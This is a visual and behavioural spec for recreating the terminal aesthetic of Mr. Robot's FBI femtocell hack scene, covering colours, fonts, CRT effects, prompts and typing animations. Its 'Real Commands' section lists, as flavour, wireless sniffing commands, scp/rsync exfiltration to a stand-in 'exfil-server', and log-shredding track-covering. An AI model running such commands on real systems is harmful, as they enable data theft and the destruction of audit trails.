# Mr. Robot FBI Keypad - Research Spec

> **Source**: Mr. Robot TV Series (USA Network, 2015-2019)
> **Episodes**: Season 2, Episodes 5-7 (eps2.3_logic-b0mb.hc through eps2.5_h4ndshake.sme)
> **Scene**: Angela Moss executes the FBI femtocell hack at E Corp headquarters
> **Effect**: Classic hacker terminal aesthetic with realistic Linux commands
> **Purpose**: Reference document for accurate implementation

---

## 1. Scene Overview

### Context
Angela Moss, a non-technical employee at E Corp, is recruited/blackmailed by fsociety to plant a femtocell device in the FBI's temporary office on the 23rd floor of E Corp headquarters. The device intercepts all cellular data from FBI agents' phones within a 100-foot radius.

### The Hack Sequence
1. Angela receives instructions and a femtocell device from fsociety
2. She connects the device to the E Corp network via an open Ethernet port
3. The device creates a rogue cell tower, intercepting FBI phone traffic
4. Darlene remotely accesses the device via a hidden Wi-Fi network
5. Data is exfiltrated: texts, emails, photos, calendar entries from FBI Android phones
6. The hack is controlled via a Linux terminal with specific commands

### Technical Basis (Real-World)
The hack is based on a real 2013 Black Hat presentation where researchers demonstrated femtocell vulnerabilities on Verizon devices. The show's technical consultants (Kor Adana, Ryan Kazanciyan, Marc Rogers, James Plouffe, Andre McGregor) ensured accuracy.

---

## 2. Visual Design

### Color Palette

The Mr. Robot terminal uses the classic "hacker green" aesthetic with specific color values:

| Element | Color Name | Hex | RGB | Usage |
|---------|------------|-----|-----|-------|
| Background | Deep Black | `#0a0a0a` | (10, 10, 10) | Terminal background |
| Background Alt | Dark Navy | `#0a181c` | (10, 24, 28) | Secondary/ambient background |
| Primary Text | Phosphor Green | `#00FF41` | (0, 255, 65) | Main terminal text |
| Secondary Text | Cyan | `#7aecff` | (122, 236, 255) | Highlights, prompts |
| Accent Blue | Teal | `#1e505f` | (30, 80, 95) | Borders, dividers |
| Accent Cyan | Light Cyan | `#6cc1e8` | (108, 193, 232) | Secondary accents |
| Accent Blue | Medium Blue | `#4da6d1` | (77, 166, 209) | Tertiary accents |
| Error/Alert | Bright Red | `#ff3333` | (255, 51, 51) | Error messages |
| Success | Bright Green | `#00ff00` | (0, 255, 0) | Success indicators |
| Warning | Amber | `#ffaa00` | (255, 170, 0) | Warning messages |

### Alternative Palette (Evil Corp Style)
The show also uses a darker corporate aesthetic:

| Element | Hex | RGB |
|---------|-----|-----|
| Background | `#0a181c` | (10, 24, 28) |
| Primary | `#7aecff` | (122, 236, 255) |
| Secondary | `#6cc1e8` | (108, 193, 232) |
| Tertiary | `#4da6d1` | (77, 166, 209) |
| Accent | `#1e505f` | (30, 80, 95) |

### Typography

| Element | Font | Size | Style |
|---------|------|------|-------|
| Primary Terminal | **Meslo LG S Mono** (Nerd Fonts) | 14-16px | Regular |
| Alternative | **Monaco** (macOS) | 12-14px | Regular |
| Alternative | **Fira Code Medium** | 14px | Medium |
| Alternative | **IBM Plex Mono** | 14px | Regular |
| Display/Headers | **VT323** | 20-24px | Regular |
| System Default | **Bitstream Vera Sans Mono** | 12-14px | Regular |

**Font Characteristics:**
- Monospace only (no proportional fonts)
- No ligatures (or minimal)
- Clear distinction between similar characters (0/O, 1/l/I)
- Slightly condensed letter spacing for density
- Line height: 1.2-1.4 (tight, terminal-like)

### CRT Effects

For authentic retro terminal look:

```
/* Scanline overlay */
scanline-opacity: 0.15
scanline-spacing: 2px (every 2px)
scanline-color: rgba(0, 0, 0, 0.15)

/* Phosphor glow */
text-shadow: 0 0 5px rgba(0, 255, 65, 0.5)
text-shadow: 0 0 10px rgba(0, 255, 65, 0.3)

/* Screen curvature (optional) */
border-radius: slight curve on corners
perspective: subtle 3D depth
```

---

## 3. Terminal UI Elements

### Prompt Style

The Mr. Robot terminal uses specific prompt formats:

```
# Standard prompt
user@hostname:~$ 

# Root prompt
root@kali:~# 

# fsociety style (from show)
fsociety@fbi-target:~$ 

# Evil Corp style
evilcorp@server:~$ 

# Directory context
user@hostname:/path/to/directory$ 
```

**Prompt Components:**
- Username in cyan/green
- `@` symbol in default color
- Hostname in green/cyan
- `:` separator
- Current path in blue or default
- `$` or `#` prompt character (blinking cursor follows)

### Cursor

| Property | Value |
|----------|-------|
| Style | Block (filled rectangle) |
| Blink Rate | 530-1000ms (slower = more retro) |
| Color | Inverted (white on dark) or green |
| Animation | Hard step opacity (0 ↔ 1), no easing |

### Text Rendering

```
# Line spacing
line-height: 1.2 - 1.4

# Character spacing
letter-spacing: 0 - 1px

# Word wrap
overflow-x: scroll (horizontal scroll for long lines)

# Selection color
selection-bg: rgba(0, 255, 65, 0.3)
selection-text: #ffffff
```

---

## 4. Keypad-Specific Elements

### Input Display

The FBI hack doesn't use a traditional numeric keypad, but the terminal password entry follows these conventions:

```
# Password masking (asterisks or nothing)
Password: ********
Password: 

# Hidden input (no echo)
Enter passphrase: [cursor blinks, no characters shown]

# SSH-style
fsociety@fbi-server's password: [hidden]
```

### Authentication Sequence

Based on the show's realistic approach:

```
1. Connection attempt
   $ ssh fsociety@fbi-internal.local
   The authenticity of host 'fbi-internal.local' can't be established.
   ECDSA key fingerprint is SHA256:abc123...
   Are you sure you want to continue? (yes/no): yes

2. Password prompt
   fsociety@fbi-internal.local's password: [hidden]

3. Access granted
   Welcome to Ubuntu 14.04 LTS
   Last login: Wed Aug 10 23:42:15 2016

4. Command execution
   fsociety@fbi-server:~$ ./exploit.sh
   [+] Exploit loaded
   [+] Targeting femtocell interface
   [+] Interception active
```

### Status Indicators

```
# Progress indicators
[+] Success message (green)
[-] Error message (red)
[!] Warning message (amber/yellow)
[*] Info message (cyan)
[?] Prompt/question (white)
```

### Loading/Processing Animation

```
# Spinner
[/] [-] [\] [|]

# Dots
. .. ... ....

# Progress bar
[████████░░░░░░░░] 50%

# Typing effect (character by character)
T_y_p_i_n_g_._._._
```

---

## 5. Behavior & Animation

### Typing Effect

```
# Character delay
char-delay: 15-50ms (fast = 15ms, realistic = 30ms, slow = 50ms)

# Variable timing (human-like)
base-delay: 30ms
variance: ±15ms

# Pause at punctuation
punctuation-pause: 100-200ms

# Newline pause
newline-pause: 150-300ms
```

### Text Appearance

```
# Instant (no animation)
text-appears: immediate

# Typewriter effect
text-appears: character-by-character

# Line-by-line (terminal scroll)
text-appears: line-at-once
scroll-speed: 50-100ms per line
```

### Screen Transitions

```
# Clear screen
clear-effect: instant or scroll-up

# Screen flicker (optional CRT effect)
flicker-duration: 50-100ms
flicker-opacity: 0.8 - 1.0
```

### Key Press Feedback

```
# Visual
- Cursor position advances
- Character appears (or * for password)
- Subtle flash on key area (optional)

# Timing
keypress-display: immediate (0ms)
```

---

## 6. Real Commands from the Show

The show uses actual Linux/Kali commands:

### Network Reconnaissance
```bash
ifconfig
iwconfig
airmon-ng start wlan0
airodump-ng wlan0mon
```

### Femtocell Interaction (WRT interface)
```bash
ssh root@192.168.1.1
cd /tmp
./exploit.sh
```

### Data Exfiltration
```bash
scp -r data/ fsociety@remote-server:/backup/
rsync -avz ./intercepted/ user@exfil-server:~/data/
```

### Covering Tracks
```bash
history -c
shred -vfz -n 10 /var/log/auth.log
rm -rf /tmp/.cache
```

---

## 7. Hacker Aesthetic Elements

### Visual Style

- **Dark, moody atmosphere** - High contrast, minimal ambient light
- **Real tools** - Kali Linux, Metasploit, Nmap, actual commands
- **No fake graphics** - Text-based interfaces, no flashy 3D animations
- **Authentic error messages** - Real Linux/Unix error formats
- **Proper syntax highlighting** - Commands, arguments, outputs differentiated

### Atmospheric Details

| Element | Description |
|---------|-------------|
| Background | Near-black with subtle noise/grain |
| Glow | Subtle green phosphor glow on text |
| Scanlines | Optional horizontal lines (CRT effect) |
| Reflection | Subtle screen reflection/gloss (optional) |
| Depth | Slight vignette at corners |

### Sound Design (for reference)

| Event | Sound |
|-------|-------|
| Keypress | Soft mechanical click |
| Enter | Confirmation beep |
| Error | Low error tone |
| Success | Ascending tone |
| Connection | Modem-like handshake (optional) |

---

## 8. Implementation Notes

### Cross-Platform Considerations

**JavaScript (Canvas/Web):**
```javascript
// Font
ctx.font = '16px "Meslo LG S Mono", "Monaco", monospace';

// Colors
const COLORS = {
  background: '#0a0a0a',
  text: '#00FF41',
  cursor: '#00FF41',
  glow: 'rgba(0, 255, 65, 0.5)'
};

// Text glow
ctx.shadowColor = COLORS.glow;
ctx.shadowBlur = 5;

// Scanlines (CSS overlay)
background: repeating-linear-gradient(
  0deg,
  transparent,
  transparent 2px,
  rgba(0, 0, 0, 0.15) 2px,
  rgba(0, 0, 0, 0.15) 4px
);
```

**Python (pygame):**
```python
# Colors
BACKGROUND = (10, 10, 10)
TEXT_COLOR = (0, 255, 65)
CURSOR_COLOR = (0, 255, 65)

# Font
font = pygame.font.SysFont('monospace', 16)

# Glow effect (blit with alpha)
glow_surface = pygame.Surface((width, height), pygame.SRCALPHA)
```

**Rust (embedded-graphics):**
```rust
// Colors
const BACKGROUND: Rgb888 = Rgb888::new(10, 10, 10);
const TEXT_COLOR: Rgb888 = Rgb888::new(0, 255, 65);

// Font (needs monospace bitmap font)
let font = MonoFont {
    // Define or load monospace font data
};
```

### Animation Formulas

**Cursor Blink:**
```
opacity = floor((time_ms / blink_period_ms) % 2)
// or
opacity = sin(time_ms * PI / blink_period_ms) > 0 ? 1 : 0
```

**Typing Effect:**
```
char_index = floor(elapsed_ms / char_delay_ms)
displayed_text = full_text.substring(0, char_index)
```

**Scanline Position:**
```
scanline_offset = (time_ms / 100) % scanline_spacing
// Creates subtle downward scroll effect
```

---

## 9. Reference Materials

### Episode References
- **Season 2, Episode 5**: "eps2.3_logic-b0mb.hc" - Elliot writes the FBI hack malware
- **Season 2, Episode 6**: "eps2.4_m4ster-s1ave.aes" - Angela prepares for the hack
- **Season 2, Episode 7**: "eps2.5_h4ndshake.sme" - The FBI hack is executed

### Technical References
- **Wired**: "Our Favorite Hacker Moments From Mr. Robot Season 2" (2016)
- **Vulture**: "How Mr. Robot's Most Complicated Hack Yet Came Together" (2016)
- **Ars Technica**: "Yes, a n00b like Angela could pull off what happened on Mr. Robot" (2016)
- **Ryan Kazanciyan's Medium**: Technical consultant's breakdown of show hacks

### Visual References
- **GitHub: marcorosa/eterm** - Mr. Robot EvilCorp terminal theme for Zsh
- **Color-Hex Palette #44981** - "Mr Robot - Evil Corp" color palette
- **aesthetic.fyi/retro-terminal** - Classic terminal aesthetic design tokens

### Real-World Basis
- **Black Hat 2013**: Femtocell vulnerability presentation
- **Kali Linux**: The penetration testing OS used in the show
- **Verizon Femtocell**: The specific hardware exploited in the presentation

---

## 10. Success Criteria

Implementation should achieve:

1. **Visual Authenticity** - Looks like the show's terminal screens
2. **Accurate Colors** - Proper green-on-black with correct hex values
3. **Realistic Typography** - Monospace font with proper sizing
4. **Authentic Behavior** - Cursor blink, typing effects match show timing
5. **Proper Commands** - Real Linux/Kali command structure
6. **Atmospheric Details** - Optional CRT effects (scanlines, glow)
7. **Cross-Platform** - Works in JS, Python, and Rust implementations

---

## 11. Future Enhancements

Potential additions after core implementation:

- **Full terminal emulator** - Command history, tab completion
- **Multiple color schemes** - Amber, white-on-black variants
- **Sound effects** - Mechanical keyboard sounds
- **SSH animation** - Full connection sequence
- **Data exfil visualization** - Animated data transfer
- **Error scenarios** - Connection refused, timeout states
- **ASCII art** - fsociety logo, Mr. Robot ASCII
